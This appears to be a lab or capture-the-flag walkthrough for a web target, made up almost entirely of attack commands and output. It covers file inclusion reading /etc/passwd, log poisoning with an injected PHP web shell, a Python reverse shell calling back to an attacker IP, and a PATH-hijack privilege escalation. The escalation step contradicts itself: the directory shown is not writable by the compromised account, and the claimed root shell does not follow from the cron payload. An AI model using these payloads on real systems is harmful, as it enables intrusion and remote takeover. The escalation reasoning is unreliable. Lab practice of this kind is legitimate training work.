Web app logs user input, LFI allows log poisoning.
### Initial Recon
```
# Web app at http://10.10.10.75
# Parameter: /index.php?page=home

# Test LFI
curl "http://10.10.10.75/index.php?page=../../../../etc/passwd"
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

# LFI confirmed!
```

#### Find Log Files
```
# Common log locations
curl "http://10.10.10.75/index.php?page=../../../../var/log/apache2/access.log"
# 10.10.14.5 - - [10/Oct/2023:10:00:00] "GET /index.php HTTP/1.1" 200

# Can read access.log!
```
#### Poison Logs with PHP
```
# Inject PHP code via User-Agent
curl -A "<?php system($_GET['cmd']); ?>" http://10.10.10.75/

# Verify injection
curl "http://10.10.10.75/index.php?page=../../../../var/log/apache2/access.log&cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Get Reverse Shell
```
# Reverse shell payload
curl -A "<?php system('python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.10.14.5\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"'); ?>" http://10.10.10.75/

# Trigger the shell
curl "http://10.10.10.75/index.php?page=../../../../var/log/apache2/access.log"

# On attacker
nc -lvnp 4444
# Connection from 10.10.10.75
# www-data@target:/var/www/html$
```

#### Privilege Escalation via PATH
```
# Check PATH
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/home/user/.local/bin

# Check writable directories
find / -writable -type d 2>/dev/null | grep -v proc
# /tmp
# /home/user/.local/bin

# User's local bin is writable!
ls -la /home/user/.local/bin
# drwxrwxr-x 2 user user 4096 Oct 10 10:00 .

# Create malicious ps
cat > /home/user/.local/bin/ps << 'EOF'
#!/bin/bash
/bin/bash -p
EOF

chmod +x /home/user/.local/bin/ps

# Wait for root to run ps (cron job running every minute)
# After cron runs
whoami
# root
```



